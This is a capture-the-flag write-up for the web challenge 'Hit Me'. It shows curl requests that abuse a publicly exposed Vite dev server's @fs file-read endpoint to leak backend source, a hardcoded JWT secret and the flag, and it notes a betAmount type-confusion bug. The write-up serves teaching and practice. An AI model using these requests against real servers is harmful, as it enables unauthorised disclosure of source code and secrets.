# Hit Me Writeup

Challenge: `Hit Me`

Type: `web`

Flag: `sillyCTF{brainrot_god}`

## Summary

The frontend was running a live Vite dev server. That exposed both the React source under `/src/*` and arbitrary files from the project root via Vite's `@fs` handler.

The frontend source revealed the backend host:

- `https://snowbet-backend.sillyctf.psuccso.org`

From there, the key issue was that the frontend repo also contained the backend source in `/app/server`, and Vite would try to transform those files. When transformation failed because backend-only imports like `express` and `better-sqlite3` were unavailable in the frontend container, Vite returned an error overlay page that embedded the full backend source in the `pluginCode` field.

## Recon

Initial page fetch showed a Vite dev server:

```bash
curl -iLs https://snowbet.sillyctf.psuccso.org/
```

Pulling the exposed frontend source showed the API base URL:

```bash
curl -Ls https://snowbet.sillyctf.psuccso.org/src/api/client.ts
```

That file contained:

- `VITE_API_URL = "https://snowbet-backend.sillyctf.psuccso.org"`

Then I used Vite's filesystem endpoint:

```bash
curl -sk https://snowbet.sillyctf.psuccso.org/@fs//app/README.md
```

The README said the backend lived in `/app/server`.

## Exploit

Requesting the backend files through Vite exposed their contents inside the error page:

```bash
curl -sk https://snowbet.sillyctf.psuccso.org/@fs//app/server/server.js
curl -sk https://snowbet.sillyctf.psuccso.org/@fs//app/server/database.js
```

`server.js` contained both:

- `const JWT_SECRET = 'admin';`
- the hardcoded flag inside `/api/shop/buy-flag`

Relevant line from the leaked source:

```js
const FLAG = 'sillyCTF{brainrot_god}';
```

## Notes

While probing the API, I also found a separate bug in `/api/game/start`: `betAmount` is not type-checked. Sending objects or booleans can trigger server errors and even corrupt balances to `NULL`. That was not needed once the backend source leak was confirmed.
